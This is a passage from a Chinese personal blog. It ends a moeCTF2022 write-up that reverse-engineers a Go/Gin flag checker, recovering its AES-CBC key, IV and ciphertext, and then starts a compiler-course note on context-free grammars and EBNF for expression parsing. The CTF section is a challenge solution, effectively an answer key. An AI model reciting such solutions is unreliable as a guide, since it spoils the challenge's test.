None，子进程的环境变量将从父进程中继承。</li>
</ul>
</blockquote>
<p>wp中stdin,stderr,stdout都设置为subprocess.PIPE,这个值等于-1</p>
<p>意思是将标准输入输出错误都重定向到管道,然后才可以调用<code>p.stdin.write()</code>,还有<code>p.stdout.read()</code>两个函数</p>
<p>否则子进程的三标还是指向键盘和屏幕的,此时调用<code>p.stdin.write()</code>函数会报错</p>
<h3 id="gogogo">gogogo</h3>
<p>go语言逆向题,没有扣符号表</p>
<p>很容易就能找到这么一个函数<code>main_flagHandler</code></p>
<p>推测和flag有关系,然而这个函数的反汇编很抽象,推测是初始化的go语言的环境.</p>
<p>看了官方wp说关键函数是main_check</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">main_check</span><span class="params">(<span class="built_in">string</span> flag, <span class="type">bool</span> _r0)</span></span><br><span class="line">&#123;</span><br><span class="line">....</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v24 &lt;= *(_QWORD *)(v3 + <span class="number">16LL</span>) )</span><br><span class="line">    runtime_morestack_noctxt();</span><br><span class="line">  v27 = v2;</span><br><span class="line">  qmemcpy(&amp;v23.cap, <span class="string">&quot;---moeCTF2022---&quot;</span>, <span class="number">16LL</span>);</span><br><span class="line">  runtime_newobject((runtime__type_0 *)flag.str, (<span class="type">void</span> *)flag.len);</span><br><span class="line">  v26 = v4;</span><br><span class="line">  qmemcpy(v4, <span class="string">&quot;---moeCTF2022---&quot;</span>, <span class="number">16LL</span>);</span><br><span class="line">  runtime_stringtoslicebyte((runtime_tmpBuf *)flag.str, (<span class="built_in">string</span>)__PAIR128__(v5, flag.len), v19);</span><br><span class="line">  v6.tab = (runtime_itab_0 *)&amp;v23.cap;</span><br><span class="line">  v6.data = (<span class="type">void</span> *)<span class="number">16LL</span>;</span><br><span class="line">  main_AesEncrypt(v20, v21, v22, v23, v6);</span><br><span class="line">  <span class="keyword">if</span> ( &amp;v23 == (__uint8 *)<span class="number">-16LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v23.<span class="built_in">array</span> = v27;</span><br><span class="line">    ptr = v7;</span><br><span class="line">    v23.len = <span class="number">2LL</span> * (_QWORD)v27;</span><br><span class="line">    runtime_makeslice(<span class="number">0LL</span>, <span class="number">16LL</span>, v8, (<span class="type">void</span> *)(<span class="number">2LL</span> * (_QWORD)v27));</span><br><span class="line">    v11 = v23.<span class="built_in">array</span>;</span><br><span class="line">    v12 = v23.len;</span><br><span class="line">    v13 = ptr;</span><br><span class="line">    v14 = <span class="number">0LL</span>;</span><br><span class="line">    v15 = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">while</span> ( (<span class="type">int</span>)v11 &gt; v14 )</span><br><span class="line">    &#123;</span><br><span class="line">      v16 = v13[v14];</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v15 &gt;= v12 )</span><br><span class="line">        runtime_panicIndex();</span><br><span class="line">      (*v15)[v9] = byte_7F65E7[v16 &gt;&gt; <span class="number">4LL</span>];</span><br><span class="line">      v10 = &amp;(*v15)[<span class="number">1LL</span>];</span><br><span class="line">      v17 = byte_7F65E7[v16 &amp; <span class="number">0xF</span>LL];</span><br><span class="line">      <span class="keyword">if</span> ( v12 &lt;= (<span class="type">unsigned</span> <span class="type">int</span>)&amp;(*v15)[<span class="number">1LL</span>] )</span><br><span class="line">        runtime_panicIndex();</span><br><span class="line">      (*v15)[v9 + <span class="number">1LL</span>] = v17;</span><br><span class="line">      ++v14;</span><br><span class="line">      v15 = (runtime_tmpBuf *)((<span class="type">char</span> *)v15 + <span class="number">2LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v18 = v9;</span><br><span class="line">    runtime_slicebytetostring(v15, v13, v12, (<span class="built_in">string</span>)__PAIR128__((<span class="type">unsigned</span> <span class="type">int</span>)v10, v12));</span><br><span class="line">    <span class="keyword">if</span> ( v18 == <span class="number">96LL</span> )</span><br><span class="line">      runtime_memequal();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看来是main_check干了这么几件事:</p>
<p>首先将输入使用AES加密,然后和事先存放好的密文对照</p>
<p>AES加密中主要需要确定(原文,密钥,偏移量,模式)等等变量</p>
<p>前面有两个"---moeCTF2022---"字样正好16字节,而密钥和偏移量也要求是16字节的,因此可以推测这就是密钥和偏移量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  qmemcpy(&amp;v23.cap, &quot;---moeCTF2022---&quot;, 16LL);</span><br><span class="line">...</span><br><span class="line">  qmemcpy(v4, &quot;---moeCTF2022---&quot;, 16LL);</span><br></pre></td></tr></table></figure>
<p>如何确定模式呢?进main_AesEncrypt函数看看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// local variable allocation has failed, the output may be wrong!</span><br><span class="line">void __fastcall main_AesEncrypt(error_0 _r1, int a2, int a3, int a4, void *a5)</span><br><span class="line">...</span><br><span class="line">    crypto_cipher_NewCBCEncrypter(iv_8, v20, v15);</span><br><span class="line">...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这有个<code>crypto_cipher_NewCBCEncrypter</code>函数,因此推测使用CBC模式</p>
<p>综上找个在线网站<a
target="_blank" rel="noopener" href="https://www.mklab.cn/utils/aes">AES在线加密解密工具 -
MKLab在线工具</a></p>
<p>解一下密</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221111090020054.png"
alt="image-20221111090020054" />
<figcaption aria-hidden="true">image-20221111090020054</figcaption>
</figure>
<p>还真就解出来了</p>
<p>但是总感觉这样是瞎猫碰见死耗子,推测的地方太多了,怎么合情合理地推断呢?</p>
<p>首先要知道程序到底干了啥?控制什么时候执行到main_flagHandler?参数都是什么?</p>
<h4 id="go源代码">go源代码</h4>
<p>一看源代码,总共加起来150行左右,咱也不知道ida怎么就反编译了这么多,跟老太太裹脚一样</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/lr.png"
alt="lr" />
<figcaption aria-hidden="true">lr</figcaption>
</figure>
<blockquote>
<p><code>Gin</code>是一个用<code>Golang</code>编写的<code>Web</code>框架，
是一个基于<code>Radix</code>树的路由，小内存占用，没有反射，可预测的<code>API</code>框架，速度挺高了近40倍，支持中间件、路由组处理、JSON等多方式验证、内置了<code>JSON</code>、<code>XML</code>、<code>HTML</code>等渲染。</p>
</blockquote>
<p>也就是说server这个程序是一个go语言Gin框架搭建的应用层web服务器</p>
<h5 id="main">main</h5>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> err := RouterInit(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Panic(err)</span><br><span class="line">	&#125;</span><br><span class="line">	err := Run()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Panic(err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先调用RouterInit函数,然后调用Run函数</p>
<h5 id="routerinit">RouterInit</h5>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">RouterInit</span><span class="params">()</span></span> <span class="type">error</span> &#123;</span><br><span class="line">	gin.SetMode(<span class="string">&quot;release&quot;</span>)</span><br><span class="line">	engine = gin.Default()</span><br><span class="line">	engine.GET(<span class="string">&quot;/welcome&quot;</span>, welcomeHandler)</span><br><span class="line">	flagRouter := engine.Group(<span class="string">&quot;/find&quot;</span>)</span><br><span class="line">	flagRouter.Use(authRequired)</span><br><span class="line">	flagRouter.GET(<span class="string">&quot;/&quot;</span>, findHandler)</span><br><span class="line">	flagRouter.GET(<span class="string">&quot;/flag&quot;</span>, flagHandler)</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里面注册了如果收到GET方法的报文并且负载是"/welcome",则调用welcomeHandler函数</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221111091736911.png"
alt="image-20221111091736911" />
<figcaption aria-hidden="true">image-20221111091736911</figcaption>
</figure>
<p>然后后面干了啥呢?</p>
<p>上网搜了一下,这是一个名叫"路由"的机制,推测是这么一个意思:</p>
<p>可以认为,engine就是访问<code>localhost:8080</code>之后立刻得到的页面的</p>
<p>然后<code>/welcome</code>被路由到welcomeHandler函数,执行完后再返回engine对一个你得页面</p>
<p>flagRouter是一个新的路由,也是engine的子路由,只要是<code>/find</code>路由分支,都会由engine进入flagRouter路由</p>
<p>然后给他注册了两个路由,如果是<code>/find/</code>就会转到findHandler</p>
<p>如果是<code>/find/flag/</code>就会转到flagHandler</p>
<p>当然这里只是注册,不会执行,实际上执行是在Run之后</p>
<h5 id="run">Run</h5>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Run</span><span class="params">()</span></span> <span class="type">error</span> &#123;</span><br><span class="line">	log.Println(<span class="string">&quot;Service running at [127.0.0.1:8080]&quot;</span>)</span><br><span class="line">	fmt.Println(<span class="string">&quot;Type localhost:8080/welcome in your browser and open it&quot;</span>)</span><br><span class="line">	err := engine.Run(<span class="string">&quot;127.0.0.1:8080&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>engine.Run就在本机的8080端口上启动HTTP服务了,此后程序一直监听该端口上的客户请求.</p>
<p>根据RouterInit中注册的路由,回应客户的请求,然后恢复到监听状态准备下一个客户的请求(或者一个接待线程,一个服务线程,到底怎么实现,现在不关心)</p>
<h5 id="flaghandler">flagHandler</h5>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">flagHandler</span><span class="params">(ctx *gin.Context)</span></span> &#123;</span><br><span class="line">	flag = ctx.Query(<span class="string">&quot;flag&quot;</span>)<span class="comment">//负载</span></span><br><span class="line">	<span class="keyword">if</span> flag == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		ctx.JSON(<span class="number">400</span>, gin.H&#123;</span><br><span class="line">			<span class="string">&quot;message&quot;</span>: <span class="string">&quot;please input your flag and I will check it&quot;</span>,</span><br><span class="line">		&#125;)</span><br><span class="line">		ctx.Abort()</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> !check(flag) &#123;</span><br><span class="line">		ctx.JSON(<span class="number">200</span>, gin.H&#123;</span><br><span class="line">			<span class="string">&quot;message&quot;</span>: <span class="string">&quot;flag incorrect, please try again&quot;</span>,</span><br><span class="line">		&#125;)</span><br><span class="line">		ctx.Abort()</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		ctx.JSON(<span class="number">200</span>, gin.H&#123;</span><br><span class="line">			<span class="string">&quot;message&quot;</span>: <span class="string">&quot;congratulations&quot;</span>,</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ctx.SetAccepted()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>flag以GET负载的形式传递给后端</p>
<p>然后后端首先对flag判空,然后调用了check检查flag的正确性</p>
<h5 id="check">check</h5>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">check</span><span class="params">(flag <span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">	encFlag := <span class="string">&quot;200c2c3ef00f31999df93d6919aa33e42dde307be02017ebf47067099ed0bddc525d5dba0f83c122159b89ae715907cc&quot;</span></span><br><span class="line">	key := []<span class="type">byte</span>(<span class="string">&quot;---moeCTF2022---&quot;</span>)</span><br><span class="line">	iv := []<span class="type">byte</span>(<span class="string">&quot;---moeCTF2022---&quot;</span>)</span><br><span class="line">	encrypt, err := AesEncrypt([]<span class="type">byte</span>(flag), key, iv)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> hex.EncodeToString(encrypt) == encFlag &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>check中就是Aes加密了,加密之后的密文和encFlag这个值进行比较,如果相同则返回true,再回到flagHandler中进入else块</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	ctx.JSON(<span class="number">200</span>, gin.H&#123;</span><br><span class="line">		<span class="string">&quot;message&quot;</span>: <span class="string">&quot;congratulations&quot;</span>,</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后就会打印恭喜发财了</p>
<p>看来自己写的函数,对应到符号表中的函数名都会加上main_前缀</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221111094105703.png"
alt="image-20221111094105703" />
<figcaption aria-hidden="true">image-20221111094105703</figcaption>
</figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/11/03/%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90%E5%85%88%E4%BF%AE-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B1%82%E5%80%BC/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/03/%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90%E5%85%88%E4%BF%AE-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B1%82%E5%80%BC/" class="post-title-link" itemprop="url">语法分析先修-表达式求值</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-11-03 11:09:00" itemprop="dateCreated datePublished" datetime="2022-11-03T11:09:00+08:00">2022-11-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-02-07 22:52:18" itemprop="dateModified" datetime="2023-02-07T22:52:18+08:00">2023-02-07</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="语法分析">语法分析</h1>
<h2 id="算数表达式的上下文无关文法">算数表达式的上下文无关文法</h2>
<h3 id="干什么用">干什么用?</h3>
<p>教材中在语法分析一章首先提出的概念就是上下文无关语法CFG</p>
<p>语法分析器不能没有CFG,正如词法分析器不能没有正规式</p>
<p>也就是说,模式的形式化描述</p>
<p>正规式规定死了,一种语言可能使用的单词有什么</p>
<p>CFG就是规定死了,一种语言可能使用的语句有什么</p>
<p>CFG是一种语言的范式,而满足这个CFG的一句话是该种语言的实例</p>
<p>这就好比:规定汉语的语句是由主谓宾构成的,这相当于立法,就是定义CFG</p>
<p>"我吃饭"就是满足法律要求的:主(我) 谓(吃)
宾(饭),这就是汉语语句的一个实例</p>
<p>判断"我吃饭"是否合法的过程,就是将一条语句展开成多个部分的过程,</p>
<p>判断编程语言的一条语句是否合法,就尝试使用CFG规定的规则推导之</p>
<h3 id="长什么样">长什么样?</h3>
<p>以基本算数运算为例子,分析一个含有加减乘除括号的表达式,其CFG如何定义</p>
<p>CFG由一个状态四元组(非终结符集,终结符集,产生式集,开始符号)构成</p>
最初粗浅的考虑是这样的 $$
<span class="math display">\[\begin{aligned}
Context Free Grammar&amp;=(Nonterminals,Terminals,Productions,Start
Symbol)\\

&amp;\begin{cases}
Nonterminals=\{Expression\}\\
Terminals=\{+,\times,(,),id\}\\
StartSymbol=Expression\\
\begin{aligned}
Production&amp;:Expression\rightarrow\begin{cases}
Expression+ Expression\\
Expression\times Expression\\
(Expression)\\
-Expression\\
id
\end{cases}
\end{aligned}
\end{cases}
\end{aligned}\]</span>
<p>$$ ​
Nonterminals集合中只有Expression,意思是,只要是Expresion符号,都可以继续推导</p>
<p>​
Terminals集合中有所有的运算符,还有一个字面量id,这意味着,推导到最具体的了,不能再具体了</p>
<p>​
StartSymbol=Expression,这意味着,最开始的时候将整个语句视为一个表达式</p>
<h3 id="怎么干活">怎么干活?</h3>
<p>"通过推导的方法可以从CFG产生语言"</p>
<p>实际上就是根据Production产生式集中的合法规则,将抽象的Expression全都替换成具体的id的过程</p>
<p>啥意思呢?举个例子,比如对于1+2+3,一开始的时候StartSymbol="1+2+3",这个整体是一个表达式Expression
<span class="math display">\[
\begin{aligned}
exp(1+2+3)&amp;\rightarrow exp(1)+exp(2+3)\\
&amp;\rightarrow id(1)+exp(2)+exp(4)\\
&amp;\rightarrow id(1)+id(2)+id(3)
\end{aligned}
\]</span> 这就是左推导的过程,也就是化抽象为具体的过程</p>
<h3 id="严谨吗">严谨吗?</h3>
<p>前面这种定义CFG的方法是不严谨的,这么说的原因有两个,</p>
<p>一是是没有体现运算符的优先级,二是没有体现运算符的结合性</p>
<h4 id="优先级">优先级</h4>
<p>举例<code>1+2*3</code></p>
<p>按照原来的CFG定义,<span class="math inline">\(exp(1+2)\times
exp(3)\)</span>和<span class="math inline">\(exp(1)+exp(2\times
3)\)</span>两种推导路线都是合法的,这就产生了二义性</p>
<h4 id="结合性">结合性</h4>
<p>举例<code>1+2+3</code></p>
<p>按照原来的CFG定义,<span class="math inline">\(exp(1+2+3)\rightarrow
exp(1+2)+exp(3)\)</span>和<span
class="math inline">\(exp(1+2+3)\rightarrow
exp(1)+exp(2+3)\)</span>都是合法的,这就产生了二义性</p>
<h4 id="消除二义性">消除二义性</h4>
如何消除二义性?保证每个表达式后续的推导,<strong>只有唯一的路线</strong>
$$
<span class="math display">\[\begin{aligned}
Context Free Grammar&amp;=(Nonterminals,Terminals,Productions,Start
Symbol)\\

&amp;\begin{cases}
Nonterminals=\{Expression,Term,Factor\}\\
Terminals=\{+,\times,(,),id\}\\
StartSymbol=Expression\\
\begin{aligned}
Production\begin{cases}
    \begin{aligned}
    Expression&amp;\rightarrow Expression+Term\ |\ Term\\
    Term&amp;\rightarrow Term\times Factor\ | \ Factor\\
    Factor&amp;\rightarrow (Expression)\ |\ -Factor\ |\ id
    \end{aligned}
    \end{cases}
\end{aligned}
\end{cases}
\end{aligned}\]</span>
<p>$$ 如何体现优先级?</p>
<p><span
class="math inline">\(Expression\)</span>全部展开之后得到的是<span
class="math inline">\(Term1+Term2+Term3+...\)</span>只有这一种情况,</p>
<p>也就是说,将Expression视为若干乘式的和,每个乘式再各自计算自己的值后上报给加法.</p>
<p>想要计算加法就必须等所有的乘式落实之后才可以进行.这就体现了先乘后加的优先级</p>
<p>如何体现结合性?</p>
<p><span class="math inline">\(Expression\rightarrow Expression+Term\ |
\ Term\)</span></p>
<p>这意味着,要计算顶层的加法,首先需要计算子Expression的值,</p>
<p>而子Expression相当于是,顶层Expression将最右侧的<span
class="math inline">\(+Term\)</span>给踢出去.</p>
<p>这就体现了左结合</p>
<blockquote>
<p>教材上将上述两点归纳:</p>
<p>1.引入新的非终结符,增加一个子结构并提高一级优先级</p>
<p>2.递归非终结符在产生式中的位置,反应文法符号的结合性</p>
<p>这个归纳纯粹属于是懂得一看就懂,不懂得看了也不懂的那种</p>
<p>甚至"递归非终结符在产生式中的位置"啥意思我也不懂</p>
</blockquote>
<blockquote>
<p>这是在算数表达式中消除二义性,</p>
<p>实际上在编程语言中还要考虑一个分支结构的特殊性</p>
<p>if-elif-else结构中的匹配原则,就近还是就远原则等等</p>
<p>这是后话</p>
</blockquote>
<h2 id="自上而下语法分析">自上而下语法分析</h2>
<h3 id="树形结构">树形结构?</h3>
<p>由CFG可以建立两种长得差不多的树形结构,</p>
<p>分析树和语法树,</p>
<p>或者说具体语法树和抽象语法树</p>
<p>以<code>1+2*3</code>为例,推导该表达式的过程为 <span
class="math display">\[
\begin{aligned}
exp(1+2\times 3)&amp;\rightarrow exp(1)+term(2\times 3)\\
&amp;\rightarrow term(1)+term(2)\times fact(3)\\
&amp;\rightarrow fact(1)+fact(2)\times id(3)\\
&amp;\rightarrow id(1)+id(3)\times id(3)
\end{aligned}
\]</span></p>
<h4 id="分析树具体语法树">分析树(具体语法树)</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">flowchart</span><br><span class="line">PLUS1((+))</span><br><span class="line">MULT((*))</span><br><span class="line">EXP123((&quot;exp(1+2*3)&quot;))</span><br><span class="line">EXP1((&quot;exp(1)&quot;))</span><br><span class="line">TERM23((&quot;term(2*3)&quot;))</span><br><span class="line">TERM1((&quot;term(1)&quot;))</span><br><span class="line">TERM2((&quot;term(2)&quot;))</span><br><span class="line">FACT3((&quot;fact(3)&quot;))</span><br><span class="line">FACT1((&quot;fact(1)&quot;))</span><br><span class="line">FACT2((&quot;fact(2)&quot;))</span><br><span class="line">ID3((&quot;id(3)&quot;))</span><br><span class="line">ID1((&quot;id(1)&quot;))</span><br><span class="line">ID2((&quot;id(2)&quot;))</span><br><span class="line"></span><br><span class="line">EXP123----EXP1</span><br><span class="line">EXP123----PLUS1</span><br><span class="line">EXP123----TERM23</span><br><span class="line">EXP1----TERM1</span><br><span class="line">TERM1----FACT1</span><br><span class="line">FACT1----ID1</span><br><span class="line"></span><br><span class="line">TERM23----TERM2----FACT2----ID2</span><br><span class="line">TERM23----MULT</span><br><span class="line">TERM23----FACT3----ID3</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="语法树抽象语法树">语法树(抽象语法树)</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">graph</span><br><span class="line">1((1))</span><br><span class="line">	2((2))</span><br><span class="line">	3((3))</span><br><span class="line">	mul((*))</span><br><span class="line">	plus((+))</span><br><span class="line">	plus----1</span><br><span class="line">	plus----mul</span><br><span class="line">	mul----2</span><br><span class="line">	mul----3</span><br></pre></td></tr></table></figure>
<h4 id="两种树的区别">两种树的区别</h4>
<p>抽象语法树中,叶子节点都是字面量,不能再推导,内部节点肯定都是运算符.</p>
<p>求值时当前节点只需要根据自己的运算规则,取出左右儿子递归运算值,算一下然后交给父节点</p>
<p>咱也不知道这具体语法树有什么作用,明明抽象语法树简洁清晰并且也能完成功能</p>
<h3 id="状态转移图和ebnf">状态转移图和EBNF</h3>
<h4 id="一眼丁真">一眼丁真</h4>
<p>状态转移图实际上就是为了形式化地得到EBNF,要是能够从本来的文法直接看出EBNF文法,则不需要状态转移图</p>
<p>对于表达式这种简单的文法,直接就能看出EBNF来 <span
class="math display">\[
\begin{aligned}
Expression&amp;\rightarrow Term\ \{(+|-)Term\}\\
Term&amp;\rightarrow Factor\ \{(\times |/) Factor\}\\
Factor&amp;\rightarrow (Expression)\ |\ id\ |num
\end{aligned}
\]</span> ​ 其中</p>
<p>花括号{}中的内容可以重复0次或者若干次,相当于星闭包</p>
<p>怎么理解文法的EBNF表示呢? <span class="math display">\[
\begin{aligned}
Expression &amp;\rightarrow Term\ \{(+|-)Term\}\\
        &amp;\rightarrow Term±Term±Term±...±Term
        \end{aligned}
\]</span>
也就是说Expression至少由一个Term组成,还可以是若干个Term的加减组成</p>
<h4 id="一眼看不出来咋办">一眼看不出来咋办?</h4>
<p>现在已经知道的是文法规则 <span class="math display">\[
\begin{aligned}
Language&amp;\rightarrow Expression;Language|\epsilon\\
Expression&amp;\rightarrow Term\ Expression&#39;\\
Expression&#39;&amp;\rightarrow +Term\ Expression&#39;|\epsilon\\
Term&amp;\rightarrow Factor \ Term&#39;\\
Term&#39;&amp;\rightarrow \times Factor\ Term&#39;|\epsilon\\
Factor&amp;\rightarrow (Expression)|-Factor|id
\end{aligned}
\]</span></p>
<p>要求出文法的EBNF表示.</p>
<p>眼神不好,不能一眼丁真,就得借助状态转移图</p>
<p>怎么由原来的文法翻译成状态转移图?</p>
<p>以Language为例子:</p>
